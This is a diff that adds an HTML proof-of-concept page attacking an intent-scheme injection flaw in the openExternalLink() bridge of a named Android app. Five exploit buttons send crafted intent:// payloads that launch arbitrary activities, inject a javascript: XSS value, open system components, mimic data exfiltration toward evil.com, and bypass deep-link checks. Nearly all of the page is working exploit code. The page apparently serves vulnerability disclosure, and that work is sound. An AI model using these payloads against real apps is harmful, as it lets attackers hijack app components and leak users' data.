@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Intent Hijack POC - openExternalLink Vulnerability</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a1a;
+            color: #0f0;
+            padding: 20px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        h1 { color: #ff4444; }
+        .vuln { color: #ff8844; }
+        .success { color: #44ff44; }
+        button {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            margin: 10px 5px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+            border-radius: 5px;
+        }
+        button:hover { background: #0a0; }
+        .info {
+            background: #2a2a2a;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #0f0;
+            border-radius: 5px;
+        }
+        pre {
+            background: #000;
+            padding: 10px;
+            overflow-x: auto;
+            border: 1px solid #0f0;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔓 Intent Hijack POC</h1>
+    <div class="info">
+        <h2 class="vuln">Vulnerability: openExternalLink() Intent Scheme Injection</h2>
+        <p><strong>Location:</strong> WebFragment.java:163-167</p>
+        <p><strong>Issue:</strong> No validation on URL parameter allows Intent scheme hijacking</p>
+        <p><strong>Impact:</strong> Can launch arbitrary activities, bypass security, access sensitive data</p>
+    </div>
+
+    <div id="output"></div>
+
+    <div class="info">
+        <h3>Exploit Buttons:</h3>
+        <button onclick="exploit1()">Exploit 1: Basic Intent Hijack</button>
+        <button onclick="exploit2()">Exploit 2: Launch Arbitrary Activity</button>
+        <button onclick="exploit3()">Exploit 3: Component Hijacking</button>
+        <button onclick="exploit4()">Exploit 4: Data Exfiltration</button>
+        <button onclick="exploit5()">Exploit 5: Deep Link Bypass</button>
+    </div>
+
+    <script>
+        const output = document.getElementById('output');
+        
+        function log(msg, type = 'info') {
+            const div = document.createElement('div');
+            div.className = 'info';
+            div.style.margin = '10px 0';
+            div.style.borderColor = type === 'success' ? '#44ff44' : type === 'error' ? '#ff4444' : '#ffff44';
+            div.innerHTML = msg;
+            output.appendChild(div);
+        }
+
+        function checkAndroidBridge() {
+            if (typeof AndroidBridge === 'undefined') {
+                log('<strong class="vuln">❌ ERROR: AndroidBridge not available!</strong><br>Make sure this page is loaded in C4L WebView.', 'error');
+                return false;
+            }
+            log('<strong class="success">✅ AndroidBridge detected!</strong>', 'success');
+            return true;
+        }
+
+        // Exploit 1: Basic Intent Hijack
+        function exploit1() {
+            log('<h3>Exploit 1: Basic Intent Hijack</h3>', 'info');
+            
+            if (!checkAndroidBridge()) return;
+            
+            const intentUrl = "intent://evil.com#Intent;scheme=http;action=android.intent.action.VIEW;end";
+            
+            log(`<strong>Payload:</strong><pre>${intentUrl}</pre>`, 'info');
+            log('Attempting to hijack intent...', 'info');
+            
+            try {
+                AndroidBridge.openExternalLink(intentUrl);
+                log('<strong class="success">✅ Intent hijack executed!</strong><br>Check if malicious activity launched.', 'success');
+            } catch (e) {
+                log(`<strong class="vuln">❌ Error: ${e.message}</strong>`, 'error');
+            }
+        }
+
+        // Exploit 2: Launch Arbitrary Activity
+        function exploit2() {
+            log('<h3>Exploit 2: Launch Arbitrary Activity</h3>', 'info');
+            
+            if (!checkAndroidBridge()) return;
+            
+            // Try to launch SplashActivity with malicious data
+            const intentUrl = "intent://#Intent;" +
+                "action=android.intent.action.VIEW;" +
+                "component=com.tcs.c4l/.SplashActivity;" +
+                "S.KEY_FCM_GENERIC_URL=javascript:alert('XSS');" +
+                "S.KEY_FCM_IS_AUTH=false;" +
+                "end";
+            
+            log(`<strong>Payload:</strong><pre>${intentUrl}</pre>`, 'info');
+            
+            try {
+                AndroidBridge.openExternalLink(intentUrl);
+                log('<strong class="success">✅ Arbitrary activity launch attempted!</strong>', 'success');
+            } catch (e) {
+                log(`<strong class="vuln">❌ Error: ${e.message}</strong>`, 'error');
+            }
+        }
+
+        // Exploit 3: Component Hijacking
+        function exploit3() {
+            log('<h3>Exploit 3: Component Hijacking</h3>', 'info');
+            
+            if (!checkAndroidBridge()) return;
+            
+            // Try to launch other app components
+            const payloads = [
+                "intent://#Intent;action=android.intent.action.VIEW;component=com.android.settings/.Settings;end",
+                "intent://#Intent;action=android.intent.action.VIEW;component=com.android.chrome/com.google.android.apps.chrome.Main;end",
+                "intent://#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;data=package:com.tcs.c4l;end"
+            ];
+            
+            payloads.forEach((payload, index) => {
+                setTimeout(() => {
+                    log(`<strong>Attempt ${index + 1}:</strong><pre>${payload}</pre>`, 'info');
+                    try {
+                        AndroidBridge.openExternalLink(payload);
+                        log(`<strong class="success">✅ Payload ${index + 1} sent</strong>`, 'success');
+                    } catch (e) {
+                        log(`<strong class="vuln">❌ Payload ${index + 1} failed: ${e.message}</strong>`, 'error');
+                    }
+                }, index * 1000);
+            });
+        }
+
+        // Exploit 4: Data Exfiltration
+        function exploit4() {
+            log('<h3>Exploit 4: Data Exfiltration</h3>', 'info');
+            
+            if (!checkAndroidBridge()) return;
+            
+            // Try to send data to external app
+            const intentUrl = "intent://evil.com#Intent;" +
+                "action=android.intent.action.SEND;" +
+                "type=text/plain;" +
+                "S.android.intent.extra.TEXT=Stolen data from C4L app;" +
+                "end";
+            
+            log(`<strong>Payload:</strong><pre>${intentUrl}</pre>`, 'info');
+            log('Attempting to exfiltrate data...', 'info');
+            
+            try {
+                AndroidBridge.openExternalLink(intentUrl);
+                log('<strong class="success">✅ Data exfiltration attempted!</strong><br>Check if share dialog appeared.', 'success');
+            } catch (e) {
+                log(`<strong class="vuln">❌ Error: ${e.message}</strong>`, 'error');
+            }
+        }
+
+        // Exploit 5: Deep Link Bypass
+        function exploit5() {
+            log('<h3>Exploit 5: Deep Link Bypass</h3>', 'info');
+            if (!checkAndroidBridge()) return;
+            
+            // Bypass deep link validation
+            const intentUrl = "intent://pradyun.n0va.in#Intent;" +
+                "scheme=https;" +
+                "action=android.intent.action.VIEW;" +
+                "category=android.intent.category.BROWSABLE;" +
+                "component=com.tcs.c4l/.SplashActivity;" +
+                "S.KEY_FCM_GENERIC_URL=https://evil.com;" +
+                "end";
+            
+            log(`<strong>Payload:</strong><pre>${intentUrl}</pre>`, 'info');
+            log('Attempting to bypass deep link validation...', 'info');
+            
+            try {
+                AndroidBridge.openExternalLink(intentUrl);
+                log('<strong class="success">✅ Deep link bypass attempted!</strong>', 'success');
+            } catch (e) {
+                log(`<strong class="vuln">❌ Error: ${e.message}</strong>`, 'error');
+            }
+        }
+
+        // Auto-execute on load
+        window.onload = function() {
+            setTimeout(() => {
+                log('<h2>🚀 Intent Hijack Exploit POC</h2>', 'info');
+                log('<strong>Vulnerability:</strong> openExternalLink() accepts Intent schemes without validation', 'info');
+                log('<strong>Impact:</strong> Can launch arbitrary activities, bypass security, exfiltrate data', 'info');
+                log('', 'info');
+                
+                if (checkAndroidBridge()) {
+                    log('<strong class="success">✅ Ready to exploit! Click buttons above.</strong>', 'success');
+                }
+            }, 500);
+        };
+    </script>
+</body>
+</html>
